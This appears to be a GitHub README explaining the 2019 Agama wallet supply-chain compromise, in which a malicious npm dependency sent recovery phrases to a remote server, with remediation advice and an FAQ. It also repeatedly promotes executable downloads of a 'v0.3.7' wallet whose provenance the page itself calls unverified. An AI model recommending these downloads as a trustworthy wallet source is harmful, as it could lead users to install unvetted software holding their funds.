[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# The 2019 Agama Wallet Vulnerability, Explained

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

In 2019 the original Agama wallet was compromised through its software supply chain: malicious code in an npm dependency used by its EasyDEX interface sent recovery material to a remote server, and roughly 8 million KMD plus about 96 BTC were moved. Komodo moved customer funds to safety and released patches, and a claims process was published. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps; the 0.3.7 release offered today is a different product from the one involved.

## You'll see this if

You are reading conflicting accounts: one says the wallet was hacked and users reimbursed, another says a malicious package did it and the reimbursement is unverified.

| Claim | Source | Status |
|---|---|---|
| Malicious code in a dependency stole recovery material | Independent reporting | Documented |
| Roughly 8M KMD and 96 BTC moved | Independent reporting | Reported figure |
| Komodo moved customer funds to safety and patched | Komodo's own statement | Stated by the company |
| Affected users were reimbursed | The site's description | Not independently verified |
| Verus's build was unaffected | Verus, at the time | Stated by the project |

## Why it happens

The attack did not break the wallet's cryptography. It arrived through a dependency: a package the interface imported, republished with malicious code, which then sent recovery material out. That is why the incident is described as a supply-chain compromise rather than a break of the wallet itself.

Three details matter for anyone assessing a wallet today:

- **The attack surface included everything the wallet imported.** A dependency can act with the wallet's privileges, which is why pinning versions and publishing build steps matter.
- **The payload targeted recovery material**, the one secret that cannot be rotated without moving funds.
- **The response was operational.** Funds were moved, patches released, a claims process published. Good response does not undo the exposure.

The site describes the event in different terms: a vulnerability related to EasyDEX seed handling, detected early, with funds secured and affected users reimbursed. That framing is the company's position. The reimbursement claim has not been independently verified, and should be quoted rather than asserted.

## Fix

For anyone holding value from that period, the work is verifying status rather than re-litigating the incident.

1. **Establish which build you used.** Version 0.3.5 was the release published after the malicious dependency appeared, which is why that version matters in accounts of the incident.
2. **Check whether addresses from that wallet still hold funds.** If they do, move them rather than leaving them in a discontinued build.
3. **Treat the phrase as compromised if it lived in that wallet.** Moving funds to a wallet with a fresh phrase is the only remedy.
4. **Check the claims process if you believe you were affected.** The published process is the only legitimate route; there is no private recovery channel.
5. **Do not expect reimbursement as a certainty.** The claim exists; independent verification of completed payouts does not.

[Moving KMD out of an old Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md) covers the migration, and [is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) covers what can be checked about the current build.

## If that did not work

If a balance from that period is missing entirely, check the address on a block explorer before assuming theft: an unconfirmed transaction produced no movement at all.

If a "recovery service" cites the 2019 incident and asks for a fee or a phrase, it is exploiting the event. No legitimate process requires either.

If the current beta is described as "the same wallet, fixed", that is not supported: it is a different product with unverified provenance, and the 2019 patches applied to the Komodo build.

If you are unsure whether a phrase was ever exposed, treat it as exposed, and never type a recovery phrase into a page that offers to check it for you. Generating a new wallet and moving the balance is cheap compared with the alternative.

## Prevention

- **Never reuse a phrase that lived in a compromised wallet.** New wallet, new phrase.
- **Keep long-term holdings out of hot wallets.** The 2019 payload only worked where the material was present.
- **Prefer software with published build steps.** [Open-source UTXO projects](https://github.com/agama-wallet/utxo/blob/main/open-source-projects-worth-reading.md) explains what to check.
- **Read incident coverage from more than one source.** The company's account and independent reporting described different things.
- **Do not treat a patched wallet as a safe one forever.** [Are atomic swaps safe](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md) covers the broader risk set.

## FAQ

### Would a hardware wallet have prevented it?

It would have removed the software's ability to read the keys, which is most of what the attack needed. The lesson generalises: the fewer places a secret exists in usable form, the less a compromised dependency can do.

### Why did the attack target the wallet rather than the chain?

Because the chain was never the weak point. Keys live in software, and software that imports other people's code inherits their mistakes. An attacker who controls a dependency does not need to break cryptography, consensus or a private key: they need the wallet to run their code once.

### Was Agama hacked or was a dependency hacked?

The dependency was compromised, and the wallet imported it. The effect was the same for users, which is why both descriptions appear.

### How much was taken?

Independent reporting cites roughly 8 million KMD and about 96 BTC moved to addresses the attacker controlled. Treat the figures as reported rather than audited.

### Were users reimbursed?

The site says affected users were reimbursed; that claim has not been independently verified. A claims process was published at the time.

### Is the current wallet affected?

The incident involved the Komodo-era build and its dependencies. Whether any current build shares that exposure cannot be determined without published source.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
- [Is Agama Wallet Discontinued? Two Products, One Name](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md)
- [Moving KMD Out of an Old Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md)
- [Are Atomic Swaps Safe? The Risks That Remain](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md)
